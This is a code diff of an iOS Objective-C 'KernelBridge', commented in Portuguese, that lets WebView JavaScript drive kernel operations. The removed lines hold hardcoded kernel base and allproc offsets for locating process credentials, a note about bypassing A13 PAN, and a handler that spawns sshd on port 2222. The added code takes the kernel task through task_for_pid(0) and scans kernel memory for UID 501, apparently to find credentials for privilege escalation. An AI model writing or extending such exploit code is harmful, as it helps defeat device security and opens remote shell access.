@@ -1,17 +1,7 @@
 #import <Foundation/Foundation.h>
 #import <WebKit/WebKit.h>
 #include <stdint.h>
-#include <spawn.h>
-
-// --- LOCALIZADOR DE PROCESSO (CORREÇÃO DE SINTAXE C) ---
-uint64_t find_self_ucred() {
-    // Em C, remova o 'n'. Use ULL para garantir 64-bit.
-    uint64_t kbase = 0xfffffff007004000ULL; 
-    uint64_t allproc = kbase + 0x8D20ULL;   
-    
-    printf("[!] Buscando ucred em: 0x%llX\n", allproc);
-    return allproc; 
-}
+#include <mach/mach.h>
 
 @interface KernelBridge : NSObject <WKScriptMessageHandler>
 @property (nonatomic, unsafe_unretained) WKWebView *webView;
@@ -25,31 +15,37 @@ uint64_t find_self_ucred() {
     NSDictionary *data = message.body;
     NSString *op = data[@"op"];
     
-    if ([op isEqualToString:@"phys_write"]) {
-        // Converte string do JS (ex: "0x100004018") para uint64_t real
-        NSString *addrStr = data[@"addr"];
-        uint64_t target_addr = strtoull([addrStr UTF8String], NULL, 16);
+    if ([op isEqualToString:@"scan_uid"]) {
+        uint64_t current_addr = strtoull([data[@"start_addr"] UTF8String], NULL, 16);
+        uint32_t range = [data[@"range"] unsignedIntValue];
         
-        // LOG DE SEGURANÇA (Para você ver se o endereço chegou certo)
-        NSString *logMsg = [NSString stringWithFormat:@"log('Tentando ler: 0x%llX')", target_addr];
-        [self.webView evaluateJavaScript:logMsg completionHandler:nil];
+        // Target: UID 501 (usuário padrão iOS)
+        uint32_t target_uid = 501;
+        BOOL found = NO;
 
-        // --- PREVENÇÃO DE CRASH (A13 PAN BYPASS) ---
-        // IMPORTANTE: No A13, você não pode fazer *ptr = val. 
-        // Isso causará o crash (Kernel Panic) que você viu.
-        // Use uma função de LOG antes para testar a bridge.
-        
-        [self.webView evaluateJavaScript:@"log('⚠️ Aviso: Escrita direta bloqueada pelo Hardware PAN.')" completionHandler:nil];
-    }
+        task_t kernel_task;
+        task_for_pid(mach_task_self(), 0, &kernel_task);
 
-    if ([op isEqualToString:@"spawn_ssh"]) {
-        pid_t pid;
-        const char *path = "/usr/sbin/sshd";
-        char *const argv[] = {(char *)path, "-p", "2222", "-D", NULL};
-        int status = posix_spawn(&pid, path, NULL, NULL, argv, NULL);
-        
-        if (status == 0) {
-            [self.webView evaluateJavaScript:@"log('🚀 SSHD Spawn Ok!')" completionHandler:nil];
+        for (uint32_t i = 0; i < range; i += 4) {
+            uint64_t check_addr = current_addr + i;
+            vm_offset_t data_ptr;
+            mach_msg_type_number_t sz = 4;
+            
+            // Leitura segura (Não crasha se falhar)
+            if (vm_read(kernel_task, (vm_address_t)check_addr, 4, &data_ptr, &sz) == KERN_SUCCESS) {
+                uint32_t val = *(uint32_t *)data_ptr;
+                if (val == target_uid) {
+                    NSString *js = [NSString stringWithFormat:@"log('🎯 <b>ENCONTRADO!</b> UID 501 em: <span class=\"addr\">0x%llX</span>')", check_addr];
+                    [self.webView evaluateJavaScript:js completionHandler:nil];
+                    found = YES;
+                    break;
+                }
+                vm_deallocate(mach_task_self(), data_ptr, sz);
+            }
+        }
+
+        if (!found) {
+            [self.webView evaluateJavaScript:@"log('❌ UID 501 não localizado nesta faixa.')" completionHandler:nil];
         }
     }
 }
